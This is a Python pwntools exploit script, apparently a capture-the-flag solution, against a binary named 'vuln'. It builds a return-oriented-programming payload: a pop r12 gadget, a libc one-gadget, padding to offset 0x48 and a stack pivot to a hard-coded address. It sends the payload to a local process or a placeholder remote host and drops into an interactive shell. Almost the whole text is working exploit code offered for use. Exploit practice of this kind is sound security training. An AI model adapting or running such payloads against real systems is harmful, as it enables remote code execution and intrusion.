#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe
context.arch = 'amd64'
context.terminal = ["urxvt", "-e", "sh", "-c"]


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.DEBUG:
			gdb.attach(r)
	else:
		r = remote("addr", 1337)

	return r


def main():
	r = conn()
	#gdb.attach(r)

	# good luck pwning :)



	libc.addr = 0x007ffff7dd5000

	one_gadg = libc.addr + 0xc825a
	stack_shift = 0x4011a5
	stack_addr = 0x7fffffffddd0
	p_r12 = libc.addr + 0x23e9a

	payload = p64(0)*3
	payload += p64(p_r12)
	payload += p64(0)
	payload += p64(one_gadg)
	payload += b"A"*(0x48-len(payload))
	payload += p64(stack_shift)
	payload += p64(stack_addr)

	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()
